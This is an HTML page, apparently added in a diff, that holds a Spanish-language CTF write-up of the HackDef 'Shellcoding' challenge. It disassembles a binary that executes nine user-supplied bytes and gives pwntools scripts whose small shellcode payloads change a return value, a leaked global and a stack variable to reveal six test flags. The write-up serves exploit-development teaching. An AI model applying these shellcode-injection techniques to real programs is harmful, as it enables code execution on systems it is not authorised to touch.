@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackDef Shellcoding</title>
+
+  <meta name="description" content="Resolución del reto Shellcoding del CTF de HackDef">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackDef Shellcoding">
+  <meta name="twitter:description" content="Resolución del reto Shellcoding del CTF de HackDef">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/hackdef.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackDef Shellcoding">
+  <meta property="og:description" content="Resolución del reto Shellcoding del CTF de HackDef">
+  <meta property="og:image" content="/images/otros/hackdef.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/hackdef.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackDef Shellcoding" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/xchg2pwn" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackDef</h4>
+    <picture><img src="/images/otros/hackdef.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Shellcoding</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Al ejecutar el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackDef/Shellcoding/mov_eax_flag">binario</a> que se otorga simplemente muestra una dirección de memoria, que ahora mismo no sabemos que es pero podria servirnos como leak del binario.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./mov_eax_flag</span><span class="p">
+ADDR: 0x569751a0</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos desensamblando el binario, la función <code class="language-plaintext highlighter-rouge">main</code>, reserva espacio a una variable <code class="language-plaintext highlighter-rouge">varGlobal</code> y le establece como contenido la string <code class="language-plaintext highlighter-rouge">A</code> o <code class="language-plaintext highlighter-rouge">0x41</code>, luego muestra la dirección de la varible con <code class="language-plaintext highlighter-rouge">printf</code> y llama a <code class="language-plaintext highlighter-rouge">3</code> funciones que ahora analizaremos.</p>
+<a href="/challenges/shellcoding/1.png" target="_blank"><div><p><img src="/challenges/shellcoding/1.png"></p></div></a>
+
+<p class="plain-text">La primera función a la que llama es <code class="language-plaintext highlighter-rouge">PedirMemoria</code>, utiliza <code class="language-plaintext highlighter-rouge">mmap</code> para reservar <code class="language-plaintext highlighter-rouge">9</code> bytes con la protección <code class="language-plaintext highlighter-rouge">6</code> o <code class="language-plaintext highlighter-rouge">wx</code> y usa memset para establecer los bytes a <code class="language-plaintext highlighter-rouge">0xcc</code>.</p>
+<a href="/challenges/shellcoding/2.png" target="_blank"><div><p><img src="/challenges/shellcoding/2.png"></p></div></a>
+
+<p class="plain-text">Luego llama a <code class="language-plaintext highlighter-rouge">LeerShellcode</code> usando como argumento el puntero que devolvió la función anterior, ahora llama a <code class="language-plaintext highlighter-rouge">fread</code> para recibir <code class="language-plaintext highlighter-rouge">9</code> bytes y escribirlos en él.</p>
+<a href="/challenges/shellcoding/3.png" target="_blank"><div><p><img src="/challenges/shellcoding/3.png"></p></div></a>
+
+<p class="plain-text">Una vez que recibe los <code class="language-plaintext highlighter-rouge">9</code> bytes llama a ese puntero utilizando <code class="language-plaintext highlighter-rouge">call eax</code>, por lo que podemos ejecutar <code class="language-plaintext highlighter-rouge">9</code> bytes como shellcode o instrucciones ensamblador.</p>
+<a href="/challenges/shellcoding/4.png" target="_blank"><div><p><img src="/challenges/shellcoding/4.png"></p></div></a>
+
+<p class="plain-text">Entonces la explotación es simple, enviaremos un <code class="language-plaintext highlighter-rouge">int3</code> que nos servirá como breakpoint y <code class="language-plaintext highlighter-rouge">3 nops</code>, si podemos ejecutarlos podemos ejecutar otras instrucciones.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, asm
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./mov_eax_flag"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    int3
+    nop
+    nop
+    nop
+"""</span><span class="p">).ljust(</span><span class="mi">9</span><span class="p">, asm(</span><span class="s">"nop"</span><span class="p">))
+
+shell.sendline(shellcode)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit el debugger se detiene en <code class="language-plaintext highlighter-rouge">int3</code> haciendo que inmediatamente ejecute las instrucciones ensamblador que tenga después como shellcode.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.
+</span><span class="az">0xf7f70001</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/4i $eip-1
+   </span><span class="az">0xf7f70000</span><span class="p">:</span><span class="ve">  int3</span><span class="p">
+=> </span><span class="az">0xf7f70001</span><span class="p">:</span><span class="ve">  nop
+   </span><span class="az">0xf7f70002</span><span class="p">:</span><span class="ve">  nop
+   </span><span class="az">0xf7f70003</span><span class="p">:</span><span class="ve">  nop
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">A fin de poder resolver el reto vamos a simular las <code class="language-plaintext highlighter-rouge">6</code> flags en las que consiste.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls</span><span class="p"> -l
+.rw-r--r-- user user 30 B Fri Dec 12 15:43:47 2025  Flag_1.txt
+.rw-r--r-- user user 30 B Fri Dec 12 15:43:51 2025  Flag_2.txt
+.rw-r--r-- user user 30 B Fri Dec 12 15:43:55 2025  Flag_3.txt
+.rw-r--r-- user user 30 B Fri Dec 12 15:43:59 2025  Flag_4.txt
+.rw-r--r-- user user 30 B Fri Dec 12 15:44:03 2025  Flag_5.txt
+.rw-r--r-- user user 30 B Fri Dec 12 15:44:09 2025  Flag_6.txt
+
+</span><span class="ve">❯ cat</span><span class="p"> Flag_*.txt
+hackdef{f4k3_fl4g1_4_t35t1ng}
+hackdef{f4k3_fl4g2_4_t35t1ng}
+hackdef{f4k3_fl4g3_4_t35t1ng}
+hackdef{f4k3_fl4g4_4_t35t1ng}
+hackdef{f4k3_fl4g5_4_t35t1ng}
+hackdef{f4k3_fl4g6_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Volviendo al <code class="language-plaintext highlighter-rouge">main</code> vemos que muestra el valor de retorno de <code class="language-plaintext highlighter-rouge">EjecutarShellcode</code>, luego llama a <code class="language-plaintext highlighter-rouge">PrintFlag</code> mostrando la flag <code class="language-plaintext highlighter-rouge">1</code>, seguido de ello compara que el valor de retorno sea el caracter <code class="language-plaintext highlighter-rouge">H</code> o <code class="language-plaintext highlighter-rouge">0x48</code>, si se cumple entonces muestra la flag <code class="language-plaintext highlighter-rouge">2</code>.</p>
+<a href="/challenges/shellcoding/5.png" target="_blank"><div><p><img src="/challenges/shellcoding/5.png"></p></div></a>
+
+<p class="plain-text">Según las convenciones de registros sabemos que el valor de retorno se almacena en el registro <code class="language-plaintext highlighter-rouge">eax</code>, lo que podemos hacer es a través del shellcode darle el valor de <code class="language-plaintext highlighter-rouge">0x48</code> a eax, para que al retornar cumpla la validación, algo a tener en cuenta es que necesitamos enviar <code class="language-plaintext highlighter-rouge">9</code> bytes y no menos, por lo que el resto lo rellenamos con nops.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./mov_eax_flag"</span><span class="p">, </span><span class="ra">level</span><span class="o">=</span><span class="s">"error"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    push 0x48
+    pop eax
+    ret
+"""</span><span class="p">).ljust(</span><span class="mi">9</span><span class="p">, asm(</span><span class="s">"nop"</span><span class="p">))
+
+shell.sendline(shellcode)
+
+flag_1</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+flag_2</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+
+log.info(</span><span class="no">f</span><span class="s">"Flag 1: </span><span class="p">{flag_1}</span><span class="s">"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Flag 2: </span><span class="p">{flag_2}</span><span class="s">"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el binario se muestra la primera flag y al cumplir la comparación se muestra la segunda, por lo tanto nuestro exploit devuelve las primeras 2 flags.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="az">*</span><span class="p">] Flag 1: hackdef{f4k3_fl4g1_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Flag 2: hackdef{f4k3_fl4g2_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al volver al <code class="language-plaintext highlighter-rouge">main</code> terminando este bloque encontramos que con <code class="language-plaintext highlighter-rouge">printf</code> se muestra <code class="language-plaintext highlighter-rouge">varGlobal</code> lekeando su dirección, luego compara su valor que originalmente se estableció a <code class="language-plaintext highlighter-rouge">0x41</code> con <code class="language-plaintext highlighter-rouge">0x41</code>, si es diferente entonces muestra la flag <code class="language-plaintext highlighter-rouge">3</code> y va a otra comparación, si su valor es igual a <code class="language-plaintext highlighter-rouge">0x43</code> entonces muestra la flag <code class="language-plaintext highlighter-rouge">4</code>.</p>
+<a href="/challenges/shellcoding/6.png" target="_blank"><div><p><img src="/challenges/shellcoding/6.png"></p></div></a>
+
+<p class="plain-text">Entonces, ya que tenemos el leak podemos simplemente recibir la dirección de la variable y cambiar su valor por <code class="language-plaintext highlighter-rouge">0x43</code>, de esta forma pasamos las 2 comprobaciones.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./mov_eax_flag"</span><span class="p">,</span><span class="ra"> level</span><span class="o">=</span><span class="s">"error"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"ADDR: "</span><span class="p">)
+variable</span><span class="o"> =</span><span class="p"> shell.recvline().strip().decode()
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="no">f</span><span class="s">"""
+    mov byte ptr ds:</span><span class="p">{variable}</span><span class="s">, 0x43
+    ret
+"""</span><span class="p">).ljust(9, asm(</span><span class="s">"nop"</span><span class="p">))
+
+shell.sendline(shellcode)
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+
+flag_3</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+flag_4</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+
+log.info(</span><span class="no">f</span><span class="s">"Flag 3: </span><span class="p">{flag_3}</span><span class="s">"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Flag 4: </span><span class="p">{flag_4}</span><span class="s">"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al pasar la primer comparación nos devuelve la flag <code class="language-plaintext highlighter-rouge">3</code> y en la segunda comparación la flag <code class="language-plaintext highlighter-rouge">4</code>, de esta forma obtenemos 2 utilizando la misma instrucción en el shellcode.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="az">*</span><span class="p">] Flag 3: hackdef{f4k3_fl4g3_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Flag 4: hackdef{f4k3_fl4g4_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si seguimos con el flujo del <code class="language-plaintext highlighter-rouge">main</code> encontramos que la comparación ahora va a una variable local que se encuentra en <code class="language-plaintext highlighter-rouge">ebp - 0x14</code> de la función <code class="language-plaintext highlighter-rouge">main</code>, la primera comparación es que su contenido sea diferente a <code class="language-plaintext highlighter-rouge">0x4b</code> y si es asi devuelve la flag <code class="language-plaintext highlighter-rouge">5</code>, la segunda comparación valida que el byte sea igual a <code class="language-plaintext highlighter-rouge">0x44</code> y devuelve la flag <code class="language-plaintext highlighter-rouge">6</code>.</p>
+<a href="/challenges/shellcoding/7.png" target="_blank"><div><p><img src="/challenges/shellcoding/7.png"></p></div></a>
+
+<p class="plain-text">Hay que tener en cuenta que es el <code class="language-plaintext highlighter-rouge">ebp</code> del <code class="language-plaintext highlighter-rouge">main</code> y estamos ejecutando el shellcode en <code class="language-plaintext highlighter-rouge">EjecutarShellcode</code>, en el inicio de la función hace un <code class="language-plaintext highlighter-rouge">push ebp</code> que guarda el <code class="language-plaintext highlighter-rouge">ebp</code> del <code class="language-plaintext highlighter-rouge">main</code> en el stack y con el <code class="language-plaintext highlighter-rouge">mov esp, ebp</code> guarda el valor del stack en <code class="language-plaintext highlighter-rouge">ebp</code>, por lo que si accedemos al <code class="language-plaintext highlighter-rouge">[ebp]</code> de <code class="language-plaintext highlighter-rouge">EjecutarShellcode</code> tendrá el <code class="language-plaintext highlighter-rouge">ebp</code> del <code class="language-plaintext highlighter-rouge">main</code>.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> disassemble EjecutarShellcode
+Dump of assembler code for function </span><span class="am">EjecutarShellcode</span><span class="p">:
+   </span><span class="az">0x000014cf</span><span class="p"> <+0>:     </span><span class="ve">endbr32
+   </span><span class="az">0x000014d3</span><span class="p"> <+4>:     </span><span class="ve">push</span><span class="ro">   ebp
+   </span><span class="az">0x000014d4</span><span class="p"> <+5>:     </span><span class="ve">mov</span><span class="ro">    ebp</span><span class="p">,</span><span class="ro">esp
+   </span><span class="az">0x000014d6</span><span class="p"> <+7>:     </span><span class="ve">sub</span><span class="ro">    esp</span><span class="p">,</span><span class="az">0x18</span><span class="p">
+   </span><span class="az">0x000014d9</span><span class="p"> <+10>:    </span><span class="ve">call</span><span class="az">   0x167b</span><span class="p"> &lt</span><span class="am">__x86.get_pc_thunk.ax</span><span class="p">>
+   </span><span class="az">0x000014de</span><span class="p"> <+15>:    </span><span class="ve">add</span><span class="ro">    eax</span><span class="p">,</span><span class="az">0x2abe
+   </span><span class="az">0x000014e3</span><span class="p"> <+20>:    </span><span class="ve">mov</span><span class="ro">    eax</span><span class="p">,DWORD PTR [</span><span class="ro">ebp</span><span class="p">+</span><span class="az">0x8</span><span class="p">]
+   </span><span class="az">0x000014e6</span><span class="p"> <+23>:    </span><span class="ve">mov</span><span class="p">    DWORD PTR [</span><span class="ro">ebp</span><span class="p">-</span><span class="az">0xc</span><span class="p">],</span><span class="ro">eax
+   </span><span class="az">0x000014e9</span><span class="p"> <+26>:    </span><span class="ve">mov</span><span class="ro">    eax</span><span class="p">,DWORD PTR [</span><span class="ro">ebp</span><span class="p">-</span><span class="az">0xc</span><span class="p">]
+   </span><span class="az">0x000014ec</span><span class="p"> <+29>:    </span><span class="ve">call</span><span class="ro">   eax
+   </span><span class="az">0x000014ee</span><span class="p"> <+31>:    </span><span class="ve">leave
+   </span><span class="az">0x000014ef</span><span class="p"> <+32>:    </span><span class="ve">ret</span><span class="p">
+End of assembler dump.
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Guardamos en <code class="language-plaintext highlighter-rouge">edi</code> el valor del <code class="language-plaintext highlighter-rouge">ebp</code> del <code class="language-plaintext highlighter-rouge">main</code> que encontramos en <code class="language-plaintext highlighter-rouge">[ebp]</code>, restamos <code class="language-plaintext highlighter-rouge">0x14</code> y movemos a esa dirección el byte <code class="language-plaintext highlighter-rouge">0x44</code> que pasa ambas validaciones.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./mov_eax_flag"</span><span class="p">,</span><span class="ra"> level</span><span class="o">=</span><span class="s">"error"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    mov edi, dword ptr [ebp]
+    mov byte ptr [edi - 0x14], 0x44
+    ret
+"""</span><span class="p">).ljust(</span><span class="mi">9</span><span class="p">, asm(</span><span class="s">"nop"</span><span class="p">))
+
+shell.sendline(shellcode)
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+
+flag_5</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+flag_6</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+
+log.info(</span><span class="no">f</span><span class="s">"Flag 5: </span><span class="p">{flag_5}</span><span class="s">"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Flag 6: </span><span class="p">{flag_6}</span><span class="s">"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La primera validación devuelve la flag <code class="language-plaintext highlighter-rouge">5</code> y la segunda validación la flag <code class="language-plaintext highlighter-rouge">6</code> por lo que con esta última parte de la ejecución conseguimos mostrar todas las flags.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="az">*</span><span class="p">] Flag 5: hackdef{f4k3_fl4g5_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Flag 6: hackdef{f4k3_fl4g6_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con los <code class="language-plaintext highlighter-rouge">3</code> exploits funcionales lo único que nos queda es hacer una cadena de los 3 exploits para que al ejecutarlo nos devuelva el contenido de todas las <code class="language-plaintext highlighter-rouge">6</code> flags.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./mov_eax_flag"</span><span class="p">, </span><span class="ra">level</span><span class="o">=</span><span class="s">"error"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    push 0x48
+    pop eax
+    ret
+"""</span><span class="p">).ljust(</span><span class="mi">9</span><span class="p">, asm(</span><span class="s">"nop"</span><span class="p">))
+
+shell.sendline(shellcode)
+
+flag_1</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+flag_2</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+
+log.info(</span><span class="no">f</span><span class="s">"Flag 1: </span><span class="p">{flag_1}</span><span class="s">"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Flag 2: </span><span class="p">{flag_2}</span><span class="s">"</span><span class="p">)
+
+shell.close()
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./mov_eax_flag"</span><span class="p">,</span><span class="ra"> level</span><span class="o">=</span><span class="s">"error"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"ADDR: "</span><span class="p">)
+variable</span><span class="o"> =</span><span class="p"> shell.recvline().strip().decode()
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="no">f</span><span class="s">"""
+    mov byte ptr ds:</span><span class="p">{variable}</span><span class="s">, 0x43
+    ret
+"""</span><span class="p">).ljust(9, asm("nop"))
+
+shell.sendline(shellcode)
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+
+flag_3</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+flag_4</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+
+log.info(</span><span class="no">f</span><span class="s">"Flag 3: </span><span class="p">{flag_3}</span><span class="s">"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Flag 4: </span><span class="p">{flag_4}</span><span class="s">"</span><span class="p">)
+
+shell.close()
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./mov_eax_flag"</span><span class="p">,</span><span class="ra"> level</span><span class="o">=</span><span class="s">"error"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    mov edi, dword ptr [ebp]
+    mov byte ptr [edi - 0x14], 0x44
+    ret
+"""</span><span class="p">).ljust(</span><span class="mi">9</span><span class="p">, asm(</span><span class="s">"nop"</span><span class="p">))
+
+shell.sendline(shellcode)
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+
+flag_5</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+flag_6</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">).decode()
+
+log.info(</span><span class="no">f</span><span class="s">"Flag 5: </span><span class="p">{flag_5}</span><span class="s">"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Flag 6: </span><span class="p">{flag_6}</span><span class="s">"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="az">*</span><span class="p">] Flag 1: hackdef{f4k3_fl4g1_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Flag 2: hackdef{f4k3_fl4g2_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Flag 3: hackdef{f4k3_fl4g3_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Flag 4: hackdef{f4k3_fl4g4_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Flag 5: hackdef{f4k3_fl4g5_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Flag 6: hackdef{f4k3_fl4g6_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
